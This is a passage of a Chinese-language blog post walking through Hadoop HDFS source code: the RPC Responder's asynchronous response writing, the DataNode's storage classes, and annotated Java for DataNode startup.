</span><span class='line'>        <span class="k">while</span> <span class="o">(</span><span class="n">running</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">waitPending</span><span class="o">();</span>     <span class="c1">// If a channel is being registered, wait.</span>
</span><span class='line'>                <span class="n">writeSelector</span><span class="o">.</span><span class="na">select</span><span class="o">(</span><span class="n">PURGE_INTERVAL</span><span class="o">);</span>
</span><span class='line'>                <span class="n">Iterator</span><span class="o">&lt;</span><span class="n">SelectionKey</span><span class="o">&gt;</span> <span class="n">iter</span> <span class="o">=</span> <span class="n">writeSelector</span><span class="o">.</span><span class="na">selectedKeys</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
</span><span class='line'>                <span class="k">while</span> <span class="o">(</span><span class="n">iter</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>                    <span class="n">SelectionKey</span> <span class="n">key</span> <span class="o">=</span> <span class="n">iter</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
</span><span class='line'>                    <span class="n">iter</span><span class="o">.</span><span class="na">remove</span><span class="o">();</span>
</span><span class='line'>                    <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>                        <span class="k">if</span> <span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">isValid</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">key</span><span class="o">.</span><span class="na">isWritable</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>                            <span class="n">doAsyncWrite</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
</span><span class='line'>                        <span class="o">}</span>
</span><span class='line'>                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                        <span class="n">LOG</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="n">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">&quot;: doAsyncWrite threw exception &quot;</span> <span class="o">+</span> <span class="n">e</span><span class="o">);</span>
</span><span class='line'>                    <span class="o">}</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1">// omitted</span>
</span><span class='line'>            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">OutOfMemoryError</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="c1">// omitted</span>
</span><span class='line'>            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                <span class="c1">// omitted</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">doAsyncWrite</span><span class="o">(</span><span class="n">SelectionKey</span> <span class="n">key</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">Call</span> <span class="n">call</span> <span class="o">=</span> <span class="o">(</span><span class="n">Call</span><span class="o">)</span><span class="n">key</span><span class="o">.</span><span class="na">attachment</span><span class="o">();</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">call</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="k">return</span><span class="o">;</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">channel</span><span class="o">()</span> <span class="o">!=</span> <span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">channel</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="k">throw</span> <span class="k">new</span> <span class="nf">IOException</span><span class="o">(</span><span class="s">&quot;doAsyncWrite: bad channel&quot;</span><span class="o">);</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="kd">synchronized</span><span class="o">(</span><span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">responseQueue</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(</span><span class="n">processResponse</span><span class="o">(</span><span class="n">call</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">responseQueue</span><span class="o">,</span> <span class="kc">false</span><span class="o">))</span> <span class="o">{</span> <span class="c1">// 调用processResponse的第二种情况，在Responder线程中调用</span>
</span><span class='line'>                <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>                    <span class="n">key</span><span class="o">.</span><span class="na">interestOps</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
</span><span class='line'>                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">CancelledKeyException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>                    <span class="c1">// omitted</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>下面就把上面的代码综合起来讲讲。首先在Handler线程中会调用<code>doRespond()</code>，这个方法就把call放入responseQueue中，如果队列中就这一个call就亲自调用<code>processResponse()</code>，也就是说从Handler线程中将返回结果发回给客户端，否则的话就等着到时候由Responder线程来处理。Responder线程通过writeSelector来管理和客户端的连接，不像readSelector关注的是read ready，writeSelector自然关注的是write ready，一旦某个客户端的连接可写后，Responder就找出这个连接对应的Connection对象，然后从Connection的responseQueue中取出call，将结果发送回客户端。可以看到将rpc结果返回给客户端可能发生在Handler线程，也有可能发生在Responder线程。</p>

<p>至此整个流程就讲完了，经过三大组件轮番处理后，总算功德圆满。老规矩，最后附图一张。</p>

<p><img src="http://JiajunYao.github.com/images/post/hdfs-source-code-analysis/hdfs_server_handle_client_request.png"></p>

<p>参考链接：
<a href="http://blog.csdn.net/xhh198781/article/details/7280084">1</a>
<a href="http://blog.csdn.net/xhh198781/article/details/7268298">2</a>
<a href="http://tutorials.jenkov.com/java-nio/selectors.html">3</a></p>

<h2><a id="hdfs_datanode_storage_related_class"></a> DataNode中和数据相关的类</h2>

<p>我们知道DataNode中存放了具体的数据，也就是说HDFS文件系统中的数据(也就是文件)是分散存储在很多个DataNode之中的。但有一点要注意的是DataNode是以Block为单位来存放数据的，一个Block对应于DataNode本地硬盘上的一个文件。而我们认为的HDFS文件系统中的一个文件会被切割成多个Block进行存放，这里就有概念上的文件和实际上的文件的关联。对于client来说HDFS为我们抽象出了一个文件系统，这是个分布式的文件系统，但我们可以像普通文件系统一样来看待它和使用它。我们可以认为HDFS中有个文件A.txt(概念上的文件)，我们可以直接对这个文件进行读写操作，但在底层实现上这个文件会被拆成多个Block(实际上的文件)分散存放在多个DataNode的本地文件系统中。NameNode负责概念上的文件和实际上的文件的转化，比如NameNode知道一个概念上的文件由多少Block组成并且这些Block都在哪些DataNode上，同时NameNode也会维护概念上的目录结构，比如说A.txt在/jjyao/data/路径下。与NameNode相对的就是DataNode，它不知道任何概念上的东西，它不知道什么是A.txt，什么是/jjyao/data，它只知道一个个的Block文件，这些文件都存放在本地的文件系统中。<br/>
Block文件存放在本地的什么地方由配置项dfs.data.dir指定。比如我可以指定这些Block文件都存放在/datanode/data1和/datanode/data2这两个目录下(当然除了存放Block文件DataNode还会存放一些其他文件)。对于每个dfs.data.dir指定的根目录里面有current，detach等目录，其中current目录可以看成是存放Block文件的根目录，这个目录里面可以看成一颗树，树中各级目录下的文件就是Block文件和对应的meta文件。可能有人会问为什么不把所有的Block文件都直接放在current目录下呢，答案是如果Block文件很多的话，本地的文件系统可能不能很好的支持在一个目录下有太多的文件。现在我们大体知道DataNode存了什么数据(更详细的解释参加<a href="http://india.paxcel.net:6060/LargeDataMatters/wp-content/uploads/2010/09/HDFS1.pdf">这里</a>)，那么DataNode中哪些类和这些数据相关就是我们这节要讨论的问题。</p>

<p>在介绍这些类之前写给出一张直观上的图。在这里假设dfs.data.dir规定了/datanode/data1和/datanode/data2两个地方来存放DataNode中的数据，那么就有如下的一张图</p>

<p><img src="http://JiajunYao.github.com/images/post/hdfs-source-code-analysis/hdfs_datanode_storage_abstract.png"></p>

<p>可以看到DataNode通过DataStorage和FSDataset这两个类来管理着存放的数据。从这幅图中可以清晰看出来DataStorage和StorageDirectory属于一个阵营而FSDataset，FSVolumnSet，FSVolume和FSDir属于另一个阵营。它们虽然都用来管理DataNode中存放的数据，但是两块的功能不同。对于DataStorage和StorageDirectory来说主要完成的是HDFS的升级/回滚/提交操作。而对于另外一个阵营里面的类则是真正管理Block文件的，比如添加Block文件。其实只要看DataStorage和FSDataset的接口就可以知道这两个阵营所能做的事。</p>

<h2><a id="hdfs_datanode_start"></a> DataNode的启动</h2>

<p>对于DataNode集群的启动我们可以通过脚本start-all.sh来完成，这个脚本的命令会通过ssh传到各个DataNode所在的机器上，然后Java虚拟机会以DataNode.main()为入口启动DataNode。因此我们的分析也就是从DataNode.main()开始一层层深入，下面看源代码。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/* DataNode.java */</span>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">secureMain</span><span class="o">(</span><span class="n">args</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">secureMain</span><span class="o">(</span><span class="n">String</span> <span class="o">[]</span> <span class="n">args</span><span class="o">,</span> <span class="n">SecureResources</span> <span class="n">resources</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">DataNode</span> <span class="n">datanode</span> <span class="o">=</span> <span class="n">createDataNode</span><span class="o">(</span><span class="n">args</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">resources</span><span class="o">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">datanode</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
</span><span class='line'>            <span class="n">datanode</span><span class="o">.</span><span class="na">join</span><span class="o">();</span> <span class="c1">// 等待DataNode的Daemon进程结束</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">System</span><span class="o">.</span><span class="na">exit</span><span class="o">(-</span><span class="mi">1</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">System</span><span class="o">.</span><span class="na">exit</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">DataNode</span> <span class="nf">createDataNode</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[],</span>
</span><span class='line'>        <span class="n">Configuration</span> <span class="n">conf</span><span class="o">,</span> <span class="n">SecureResources</span> <span class="n">resources</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">DataNode</span> <span class="n">dn</span> <span class="o">=</span> <span class="n">instantiateDataNode</span><span class="o">(</span><span class="n">args</span><span class="o">,</span> <span class="n">conf</span><span class="o">,</span> <span class="n">resources</span><span class="o">);</span>
</span><span class='line'>    <span class="n">runDatanodeDaemon</span><span class="o">(</span><span class="n">dn</span><span class="o">);</span> <span class="c1">// 把DataNode当作一个Daemon进程启动，运行DataNode.run()方法</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">dn</span><span class="o">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">DataNode</span> <span class="nf">instantiateDataNode</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[],</span>
</span><span class='line'>        <span class="n">Configuration</span> <span class="n">conf</span><span class="o">,</span> <span class="n">SecureResources</span> <span class="n">resources</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">String</span><span class="o">[]</span> <span class="n">dataDirs</span> <span class="o">=</span> <span class="n">conf</span><span class="o">.</span><span class="na">getStrings</span><span class="o">(</span><span class="n">DATA_DIR_KEY</span><span class="o">);</span> <span class="c1">// 获取配置项dfs.data.dir的值，也就是DataNode中存放数据的目录</span>
</span><span class='line'>    <span class="k">return</span> <span class="nf">makeInstance</span><span class="o">(</span><span class="n">dataDirs</span><span class="o">,</span> <span class="n">conf</span><span class="o">,</span> <span class="n">resources</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">DataNode</span> <span class="nf">makeInstance</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">dataDirs</span><span class="o">,</span> <span class="n">Configuration</span> <span class="n">conf</span><span class="o">,</span>
</span><span class='line'>        <span class="n">SecureResources</span> <span class="n">resources</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">LocalFileSystem</span> <span class="n">localFS</span> <span class="o">=</span> <span class="n">FileSystem</span><span class="o">.</span><span class="na">getLocal</span><span class="o">(</span><span class="n">conf</span><span class="o">);</span>
</span><span class='line'>    <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">File</span><span class="o">&gt;</span> <span class="n">dirs</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">File</span><span class="o">&gt;();</span>
</span><span class='line'>    <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">dir</span> <span class="o">:</span> <span class="n">dataDirs</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>            <span class="c1">// 检查配置项dfs.data.dir中给出的路径是否valid，比如确实是个目录而不是文件</span>
</span><span class='line'>            <span class="n">DiskChecker</span><span class="o">.</span><span class="na">checkDir</span><span class="o">(</span><span class="n">localFS</span><span class="o">,</span> <span class="k">new</span> <span class="n">Path</span><span class="o">(</span><span class="n">dir</span><span class="o">),</span> <span class="n">dataDirPermission</span><span class="o">);</span>
</span><span class='line'>            <span class="n">dirs</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">dir</span><span class="o">));</span>
</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="c1">// omitted</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">dirs</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="c1">// 至少要存在一个valid的目录，不然。。。</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">new</span> <span class="nf">DataNode</span><span class="o">(</span><span class="n">conf</span><span class="o">,</span> <span class="n">dirs</span><span class="o">,</span> <span class="n">resources</span><span class="o">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">DataNode</span><span class="o">(</span><span class="kd">final</span> <span class="n">Configuration</span> <span class="n">conf</span><span class="o">,</span>
</span><span class='line'>        <span class="kd">final</span> <span class="n">AbstractList</span><span class="o">&lt;</span><span class="n">File</span><span class="o">&gt;</span> <span class="n">dataDirs</span><span class="o">,</span> <span class="n">SecureResources</span> <span class="n">resources</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">super</span><span class="o">(</span><span class="n">conf</span><span class="o">);</span>
</span><span class='line'>    <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">startDataNode</span><span class="o">(</span><span class="n">conf</span><span class="o">,</span> <span class="n">dataDirs</span><span class="o">,</span> <span class="n">resources</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">ie</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">shutdown</span><span class="o">();</span>
</span><span class='line'>        <span class="k">throw</span> <span class="n">ie</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// 启动的主要工作都在这里</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">startDataNode</span><span class="o">(</span><span class="n">Configuration</span> <span class="n">conf</span><span class="o">,</span>
</span><span class='line'>        <span class="n">AbstractList</span><span class="o">&lt;</span><span class="n">File</span><span class="o">&gt;</span> <span class="n">dataDirs</span><span class="o">,</span> <span class="n">SecureResources</span> <span class="n">resources</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// use configured nameserver &amp; interface to get local hostname</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">conf</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&quot;slave.host.name&quot;</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">machineName</span> <span class="o">=</span> <span class="n">conf</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&quot;slave.host.name&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">InetSocketAddress</span> <span class="n">nameNodeAddr</span> <span class="o">=</span> <span class="n">NameNode</span><span class="o">.</span><span class="na">getServiceAddress</span><span class="o">(</span><span class="n">conf</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">InetSocketAddress</span> <span class="n">socAddr</span> <span class="o">=</span> <span class="n">DataNode</span><span class="o">.</span><span class="na">getStreamingAddr</span><span class="o">(</span><span class="n">conf</span><span class="o">);</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">tmpPort</span> <span class="o">=</span> <span class="n">socAddr</span><span class="o">.</span><span class="na">getPort</span><span class="o">();</span>
</span><span class='line'>    <span class="n">storage</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DataStorage</span><span class="o">();</span>
</span><span class='line'>    <span class="c1">// construct registration</span>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">dnRegistration</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DatanodeRegistration</span><span class="o">(</span><span class="n">machineName</span> <span class="o">+</span> <span class="s">&quot;:&quot;</span> <span class="o">+</span> <span class="n">tmpPort</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// connect to name node</span>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">namenode</span> <span class="o">=</span> <span class="o">(</span><span class="n">DatanodeProtocol</span><span class="o">)</span> <span class="c1">// 有没有很熟悉，和之前客户端向NameNode发送rpc请求的原理差不多</span>
</span><span class='line'>        <span class="n">RPC</span><span class="o">.</span><span class="na">waitForProxy</span><span class="o">(</span><span class="n">DatanodeProtocol</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
</span><span class='line'>                <span class="n">DatanodeProtocol</span><span class="o">.</span><span class="na">versionID</span><span class="o">,</span>
</span><span class='line'>                <span class="n">nameNodeAddr</span><span class="o">,</span>
</span><span class='line'>                <span class="n">conf</span><span class="o">);</span>
</span><span class='line'>    <span class="c1">// get version and id info from the name-node</span>
</span><span class='line'>    <span class="n">NamespaceInfo</span> <span class="n">nsInfo</span> <span class="o">=</span> <span class="n">handshake</span><span class="o">();</span> <span class="c1">// 获取NameNode的版本信息，用来确保DataNode和NameNode的版本是一样的</span>
</span><span class='line'>    <span class="n">StartupOption</span> <span class="n">startOpt</span> <span class="o">=</span> <span class="n">getStartupOption</span><span class="o">(</span><span class="n">conf</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// read storage info, lock data dirs and transition fs state if necessary</span>
</span><span class='line'>    <span class="n">storage</span><span class="o">.</span><span class="na">recoverTransitionRead</span><span class="o">(</span><span class="n">nsInfo</span><span class="o">,</span> <span class="n">dataDirs</span><span class="o">,</span> <span class="n">startOpt</span><span class="o">);</span>
</span><span class='line'>    <span class="c1">// adjust</span>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">dnRegistration</span><span class="o">.</span><span class="na">setStorageInfo</span><span class="o">(</span><span class="n">storage</span><span class="o">);</span>
</span><span class='line'>    <span class="c1">// 创建一个FSDataset实例，创建完成后FSDataset内部就会有像上一节那样的图了</span>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">data</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FSDataset</span><span class="o">(</span><span class="n">storage</span><span class="o">,</span> <span class="n">conf</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// find free port or use privileged port provide</span>
</span><span class='line'>    <span class="n">ServerSocket</span> <span class="n">ss</span><span class="o">;</span>
</span><span class='line'>    <span class="k">if</span><span class="o">(</span><span class="n">secureResources</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">ss</span> <span class="o">=</span> <span class="o">(</span><span class="n">socketWriteTimeout</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">?</span>
</span><span class='line'>            <span class="n">ServerSocketChannel</span><span class="o">.</span><span class="na">open</span><span class="o">().</span><span class="na">socket</span><span class="o">()</span> <span class="o">:</span> <span class="k">new</span> <span class="n">ServerSocket</span><span class="o">();</span>
</span><span class='line'>        <span class="n">Server</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="n">ss</span><span class="o">,</span> <span class="n">socAddr</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">ss</span> <span class="o">=</span> <span class="n">resources</span><span class="o">.</span><span class="na">getStreamingSocket</span><span class="o">();</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="c1">// adjust machine name with the actual port</span>
</span><span class='line'>    <span class="n">tmpPort</span> <span class="o">=</span> <span class="n">ss</span><span class="o">.</span><span class="na">getLocalPort</span><span class="o">();</span>
</span><span class='line'>    <span class="n">selfAddr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InetSocketAddress</span><span class="o">(</span><span class="n">ss</span><span class="o">.</span><span class="na">getInetAddress</span><span class="o">().</span><span class="na">getHostAddress</span><span class="o">(),</span>
</span><span class='line'>            <span class="n">tmpPort</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">threadGroup</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ThreadGroup</span><span class="o">(</span><span class="s">&quot;dataXceiverServer&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="c1">// 这个服务器是用来处理Client或者其他DataNode对于Block文件的处理请求，比如要求发送某个Block文件的内容</span>
</span><span class='line'>    <span class="c1">// 这个服务器上使用的不是RPC机制而是一种流式机制，因为要传输Block文件的内容嘛</span>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">dataXceiverServer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Daemon</span><span class="o">(</span><span class="n">threadGroup</span><span class="o">,</span>
</span><span class='line'>            <span class="k">new</span> <span class="nf">DataXceiverServer</span><span class="o">(</span><span class="n">ss</span><span class="o">,</span> <span class="n">conf</span><span class="o">,</span> <span class="k">this</span><span class="o">));</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">DataNode</span><span class="o">.</span><span class="na">nameNodeAddr</span> <span class="o">=</span> <span class="n">nameNodeAddr</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//initialize periodic block scanner</span>
</span><span class='line'>    <span class="c1">// 单独的一个线程，定期对所有的Block文件进行扫描校验</span>
</span><span class='line'>    <span class="n">blockScanner</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DataBlockScanner</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="o">(</span><span class="n">FSDataset</span><span class="o">)</span><span class="n">data</span><span class="o">,</span> <span class="n">conf</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//create a servlet to serve full-file content</span>
</span><span class='line'>    <span class="c1">// 开启一个web服务器，运行通过浏览器来获得DataNode的状态</span>
